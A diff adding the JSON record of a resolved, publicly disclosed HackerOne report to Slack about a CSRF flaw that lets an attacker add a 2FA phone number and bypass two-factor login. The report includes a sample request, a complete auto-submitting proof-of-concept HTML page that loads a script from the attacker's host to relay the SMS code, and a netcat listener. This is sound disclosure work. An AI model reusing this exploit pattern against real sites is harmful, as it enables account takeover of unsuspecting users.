@@ -1,0 +1,107 @@
+{
+  "id": 155774,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTU3NzQ=",
+  "url": "https://hackerone.com/reports/155774",
+  "title": "CSRF - Add optional two factor mobile number",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-08-01T10:54:51.599Z",
+  "submitted_at": "2016-08-01T10:54:51.599Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "nhavis",
+    "url": "/nhavis",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 69,
+    "url": "https://hackerone.com/slack",
+    "handle": "slack",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Slack",
+      "twitter_handle": "slackhq",
+      "website": "https://slack.com",
+      "about": "All your team communication in one place, instantly searchable, and available wherever you go."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-08-17T21:39:53.991Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-08-12T00:02:41.505Z",
+  "team_member_agreed_on_going_public_at": "2016-08-17T21:39:53.836Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Description\n====================\nAdding a mobile number for 2-factor authentication is vulnerable to CSRF, allowing an attacker to bypass 2-factor authentication. An attacker would be able to force the logged in user to add a new mobile number for 2-factor authentication. The attacker would then receive the SMS code and automatically make the victim verify it (in Javascript). When the attacker attempts to login to the victim's account, the verification code can then be sent to the attacker's mobile number. \n\nAn attacker could be anyone trying to bypass 2-factor authentication, for example:\n1. Anyone who already has the password to an account.\n2. A company's IT administrator who has access to the user's e-mail and can reset the password.\n\nI have provided a complete Proof of Concept without the **crumb** parameter, which I have manually verified myself.\n\nVulnerable URL:\n====================\n* /account/settings/2fa_sms\n\nRoot cause:\n====================\nServer does not validate the existence or value of the **crumb** parameter containing the CSRF token.\n\nSample vulnerable request:\n====================\n```\nPOST /account/settings/2fa_sms HTTP/1.1\nHost: cs-sa.slack.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nCookie: REDACTED=REDACTED\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 109\n\nverify_two_factor=1&backup=&app=&primary_phone_number=%2B61+0████████&country_code=AU&phone_number=█████████\n```\n\nAttack flow:\n====================\n1. Attacker sends logged in slack user a link and slack user clicks it.\n2. The link contains HTML and Javascript code that forces the victim in to adding a new 2-factor mobile number (**slackcsrf.html** provided below). The code does not contain the **crumb** parameter.\n3. The code also connects back to the attacker's machine waiting for the attacker to enter the code so it can be used for verification (within seconds and potentially automatically).\n4. The attacker receives the code via SMS and sends it back to the victim. (**Attacker web server** provided below)\n5. The HTML code forces the victim to verify the new mobile number.\n6. The mobile number has now been added to the victim's account for 2FA.\n7. The attacker logs in and bypasses 2FA by requesting the code with the secondary mobile number.\n\nslackcsrf.html:\n---------------------\n```\n<html>\n<body>\n<IFRAME style=\"display:none\" name=\"hidden-form\"></iframe>\n    <form action=\"https://cs-sa.slack.com/account/settings/2fa_sms\" method=\"POST\" target=\"hidden-form\" name=\"pocframe\">\n      <input type=\"hidden\" name=\"verify&#95;two&#95;factor\" value=\"1\" />\n      <input type=\"hidden\" name=\"backup\" value=\"\" />\n      <input type=\"hidden\" name=\"app\" value=\"\" />\n      <input type=\"hidden\" name=\"country&#95;code\" value=\"AU\" />\n      <input type=\"hidden\" name=\"phone&#95;number\" value=\"█████████\" />\n    </form>\n<script>document.pocframe.submit();</script>\n\n<script src=\"http://192.168.1.82:8080/a\"></script>\n<IFRAME style=\"display:none\" name=\"hidden-form2\"></iframe>\n    <form action=\"https://cs-sa.slack.com/account/settings/2fa_sms\" method=\"POST\" target=\"hidden-form2\" name=\"pocframe2\">\n      <input type=\"hidden\" name=\"verify&#95;two&#95;factor\" value=\"1\" />\n      <input type=\"hidden\" name=\"backup\" value=\"1\" />\n      <input type=\"hidden\" name=\"app\" value=\"\" />\n      <input type=\"hidden\" name=\"formatted&#95;phone&#95;number\" value=\"&#43;61&#32;████████\" />\n      <input type=\"hidden\" name=\"country&#95;code\" value=\"AU\" />\n      <input type=\"hidden\" id=\"scode\" name=\"confirmation&#95;code\" value=\"\" />\n    </form>\n<script>\n\tdocument.getElementById(\"scode\").value = scode;\n\tdocument.pocframe2.submit();\n</script>\n</body>\n</html>\n```\n\nAttacker web server:\n---------------------\n```\nroot@foxtrotter:/var/www/html# nc -nlvp 8080\nlistening on [any] 8080 ...\nconnect to [192.168.1.82] from (UNKNOWN) [192.168.1.81] 56194\nGET /a HTTP/1.1\nHost: 192.168.1.82:8080\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: */*\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://192.168.1.82/slackcsrf.html\nConnection: close\nCache-Control: max-age=0\n\nHTTP/1.1 200 OK\n\nscode=196206;\n```\n",
+  "bounty_amount": "500.0",
+  "formatted_bounty": "$500",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2016-09-11T00:02:41.652Z",
+  "allow_singular_disclosure_after": -234274623.6754181,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "lucky_sen",
+    "kxyry",
+    "dudez",
+    "ibram",
+    "dyabla"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
